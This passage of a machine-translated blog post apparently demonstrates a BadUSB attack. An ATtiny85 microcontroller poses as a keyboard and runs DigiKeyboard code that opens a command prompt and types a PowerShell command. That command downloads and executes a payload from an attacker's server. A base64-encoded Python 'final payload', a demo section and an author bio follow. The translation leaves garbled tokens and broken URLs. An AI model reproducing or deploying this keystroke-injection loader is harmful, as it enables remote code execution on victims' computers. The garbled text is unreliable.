ek">Found in folders, connections to a normal USB, because I broke the USB Male Connector</figcaption></figure><h1 id="76ca" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">那么，是什么呢！？</h1><p id="3a9e" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">这是一个<strong class="kl hv"> ATiny85 </strong> <em class="lf">(也可以使用Arduino Uno r3，但它不会伪装成项链)</em>微控制器，上面加载了打了补丁的HID(人机界面设备)固件，使它有点像上面的两个连环杀手。<em class="lf">(但更便宜，更少——更技术性，比群联固件补丁少，比抓个USB橡皮鸭多)</em></p><h1 id="de91" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">分级有效载荷</h1><p id="47bb" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">在我们的微控制器内部运行的代码充当一个<strong class="kl hv"> <em class="lf">存根加载器</em> </strong>。</p><pre class="jk jl jm jn fq nb nc nd ne aw nf dt"><span id="15af" class="ng js hu nc b fv nh ni l nj nk">#include “DigiKeyboard.h”</span><span id="2140" class="ng js hu nc b fv pk ni l nj nk">#define KEY_UP_ARROW 0x52<br/>#define KEY_DOWN_ARROW 0x51<br/>#define KEY_LEFT_ARROW 0x50<br/>#define KEY_RIGHT_ARROW 0x4F<br/>void setup() {<br/>}</span><span id="4cc0" class="ng js hu nc b fv pk ni l nj nk">void loop() {<br/> DigiKeyboard.sendKeyStroke(0);<br/> DigiKeyboard.delay(300);<br/> DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<br/> DigiKeyboard.delay(300);<br/> DigiKeyboard.print(“cmd”);<br/> DigiKeyboard.sendKeyStroke(KEY_ENTER);<br/> DigiKeyboard.delay(500);<br/> DigiKeyboard.print(“powershell iex ((New-Object System.Net.WebClient).DownloadString(‘<a class="ae nv" href="http://10.163.5.244:8000/data.txt'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.1:8000/payload.txt'</a>))");<br/> DigiKeyboard.sendKeyStroke(KEY_ENTER);<br/> for(;;){ /*empty*/ }<br/>}</span></pre><p id="8d9a" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><strong class="kl hv">末级有效载荷</strong></p><pre class="jk jl jm jn fq nb nc nd ne aw nf dt"><span id="b793" class="ng js hu nc b fv nh ni l nj nk">py -c “import base64;exec(base64.b64decode(‘aW1wb3J0IHdpbjMydWkNCmltcG9ydCB3aW4zMnByaW50DQppbXBvcnQgd2luMzJjb24NCklOQ0ggPSAxNDQwDQpoREMgPSB3aW4zMnVpLkNyZWF0ZURDICgpDQpoREMuQ3JlYXRlUHJpbnRlckRDICh3aW4zMnByaW50LkdldERlZmF1bHRQcmludGVyICgpKQ0KaERDLlN0YXJ0RG9jICgiSW5qZWN0ZWQgRG9jIikNCmhEQy5TdGFydFBhZ2UgKCkNCmhEQy5TZXRNYXBNb2RlICh3aW4zMmNvbi5NTV9UV0lQUykNCmhEQy5EcmF3VGV4dCAoIkhFTExPIFdPUkxELCBieSBAMHg0OHBpcmFqIiwgKDAsIElOQ0ggKiAtMSwgSU5DSCAqIDgsIElOQ0ggKiAtMiksIHdpbjMyY29uLkRUX0NFTlRFUikNCmhEQy5FbmRQYWdlICgpDQpoREMuRW5kRG9jICgp’))”</span></pre><h1 id="12a7" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated"><strong class="ak">演示</strong></h1><h2 id="d342" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated">受害者的电脑</h2><figure class="jk jl jm jn fq jo"><div class="bz el l di"><div class="po pm l"/></div></figure><h2 id="2b7d" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated">攻击者的电脑</h2><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff pp"><img src="../Images/2836b99443d6e487aeb6fb074cf5d815.png" data-original-src="https://miro.medium.com/v2/resize:fit:1374/format:webp/1*EBNui9StPtwsCmWGGOuHXw.png"/></div></div></figure><p id="345a" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><strong class="kl hv"> <em class="lf">宾果！</em>T45】</strong></p><h1 id="3992" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">关于作者</h1><p id="9285" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">Piyush Raj现在是一名18岁的大学新生，目前在OWASP基金会担任谷歌学生开发者。他是过去的<strong class="kl hv">谷歌代码贡献获奖者</strong>，喜欢玩<strong class="kl hv">足球</strong>。</p><p id="e69f" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><em class="lf">你可以通过</em><a class="ae nv" href="https://linkedin.com/in/0x48piraj" rel="noopener ugc nofollow" target="_blank"><strong class="kl hv"><em class="lf">LinkedIn</em></strong></a><strong class="kl hv"><em class="lf">，</em></strong><a class="ae nv" href="https://twitter.com/0x48piraj" rel="noopener ugc nofollow" target="_blank"><strong class="kl hv"><em class="lf">Twitter</em></strong></a><strong class="kl hv"><em class="lf">，</em></strong><a class="ae nv" href="https://instagram.com/piyushrajofficial" rel="noopener ugc nofollow" target="_blank"><strong class="kl hv">insta gram</strong></a></p><div class="jk jl jm jn fq ab cb"><figure class="pq jo pr ps pt pu pv paragraph-image"><a href="https://www.linkedin.com/in/0x48piraj"><img src="../Images/9b2bb3f0312a7914fc0299458e6d012c.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*Az4EbkALlCIzJ30PzLI_lw.png"/></a></figure><figure class="pq jo pr ps pt pu pv paragraph-image"><a href="https://twitter.com/0x48piraj"><img src="../Images/4476e5e879742d93fec744863e67034a.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*qbhMVImJv-rUaG6J5pGaow.png"/></a></figure><figure class="pq jo pr ps pt pu pv paragraph-image"><a href="https://www.instagram.com/piyushrajofficial/"><img src="../Images/416095d604871f3e2b86a8bf4a3339fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:512/format:webp/1*MGp44ZecXqaAAERGnnwelA.png"/></a><figcaption class="mf mg fg fe ff mh mi bd b be z ek pw di px py">Social Jazz.</figcaption></figure></div><h1 id="6ca6" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">参考</h1><p id="597a" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><em class="lf">(我知道是中等，但是诶。)</em></p><ol class=""><li id="af5f" class="mk ml hu kl b km lh kp li ks mm kw mn la mo le pz mq mr ms dt translated"><a class="ae nv" href="https://www.imdb.com/title/tt3042408/" rel="noopener ugc nofollow" target="_blank"> <em class="lf">我是谁——没有系统是安全的</em> </a></li><li id="e3d0" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="https://stackoverflow.com/questions/18444194/cutting-the-videos-based-on-start-and-end-time-using-ffmpeg" rel="noopener ugc nofollow" target="_blank"><em class="lf">ffmpeg-ss 00:00:00-I input.mp4-00:00:03-c复制output.mp4</em>T3】</a></li><li id="0214" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated">【http://zulko.github.io/moviepy/install.html T4】</li><li id="71d4" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="https://www.python.org/" rel="noopener ugc nofollow" target="_blank"><em class="lf">https://www.python.org/</em></a></li><li id="bab6" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="http://timgolden.me.uk/pywin32-docs/html/com/win32com/HTML/QuickStartClientCom.html" rel="noopener ugc nofollow" target="_blank"><em class="lf">http://Tim golden . me . uk/py win32-docs/HTML/com/win32 com/HTML/quick start client com . HTML</em></a></li><li id="180b" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><em class="lf">打印机协议—</em><a class="ae nv" href="http://hacking-printers.net/wiki/index.php/LPD" rel="noopener ugc nofollow" target="_blank"><em class="lf">LPD</em></a><em class="lf">，</em><a class="ae nv" href="http://hacking-printers.net/wiki/index.php/IPP" rel="noopener ugc nofollow" target="_blank"><em class="lf">IPP</em></a><em class="lf">，</em><a class="ae nv" href="http://hacking-printers.net/wiki/index.php/Raw" rel="noopener ugc nofollow" target="_blank"><em class="lf">Raw</em></a><em class="lf">，</em> <a class="ae nv" href="http://hacking-printers.net/wiki/index.php/SMB" rel="noopener ugc nofollow" target="_blank"> <em class="lf"> SMB </em> </a></li><li id="42d7" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><em class="lf">打印机语言—</em><a class="ae nv" href="http://hacking-printers.net/wiki/index.php/PJL" rel="noopener ugc nofollow" target="_blank"><em class="lf">PJL</em></a><em class="lf">，</em><a class="ae nv" href="http://hacking-printers.net/wiki/index.php/PCL" rel="noopener ugc nofollow" target="_blank"><em class="lf">PCL</em></a><em class="lf">，</em> <a class="ae nv" href="http://hacking-printers.net/wiki/index.php/PostScript" rel="noopener ugc nofollow" target="_blank"> <em class="lf">后记</em> </a></li><li id="9d96" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="https://docs.microsoft.com/en-us/windows/desktop/shell/launch" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/windows/desktop/shell/launch</a></li><li id="0f13" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="https://github.com/mhammond/pywin32/blob/master/win32/src/win32print/win32print.cpp" rel="noopener ugc nofollow" target="_blank">T59】mhammond/py win32/win32 printT61】</a></li><li id="830c" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le pz mq mr ms dt translated"><a class="ae nv" href="https://bulbapedia.bulbagarden.net/wiki/EP037" rel="noopener ugc nofollow" target="_blank">https://bulbapedia.bulbagarden.net/wiki/EP037</a></li></ol><figure class="jk jl jm jn fq jo"><div class="bz el l di"><div class="qa pm l"/></div></figure></div></div>    
</body>
</html>